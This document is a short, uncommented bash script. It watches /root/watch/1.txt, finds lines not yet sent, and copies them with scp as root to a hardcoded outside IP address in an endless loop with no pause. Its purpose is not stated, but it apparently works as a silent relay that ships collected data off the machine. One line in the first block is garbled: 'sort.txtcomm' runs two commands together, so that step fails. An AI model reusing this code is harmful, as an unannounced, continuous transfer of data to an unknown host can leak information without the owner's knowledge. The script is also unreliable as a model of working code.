#!/bin/bash

touch /root/watch/cp.txt ; touch /root/watch/3.txt
sort /root/watch/1.txt> /root/watch/sort.txt ; > /root/watch/1.txt ; cat /root/watch/sort.txt > /root/watch/1.txt ; rm /root/watch/sort.txtcomm -3 /root/watch/1.txt /root/watch/cp.txt > /root/watch/3.txt
if [ -s /root/watch/3.txt ]
then
scp /root/watch/3.txt root@154.16.195.153:/root
cat /root/watch/3.txt >> /root/watch/cp.txt ; > /root/watch/3.txt
sort /root/watch/cp.txt> /root/watch/sort.txt ; > /root/watch/cp.txt ; cat /root/watch/sort.txt > /root/watch/cp.txt ; rm /root/watch/sort.txt
fi

while true
do
sort /root/watch/1.txt> /root/watch/sort.txt ; > /root/watch/1.txt ; cat /root/watch/sort.txt > /root/watch/1.txt ; rm /root/watch/sort.txt
comm -3 /root/watch/1.txt /root/watch/cp.txt > /root/watch/3.txt
if [ -s /root/watch/3.txt ]
then
scp /root/watch/3.txt root@154.16.195.153:/root
cat /root/watch/3.txt >> /root/watch/cp.txt ; > /root/watch/3.txt
sort /root/watch/cp.txt> /root/watch/sort.txt ; > /root/watch/cp.txt ; cat /root/watch/sort.txt > /root/watch/cp.txt ; rm /root/watch/sort.txt
fi
done
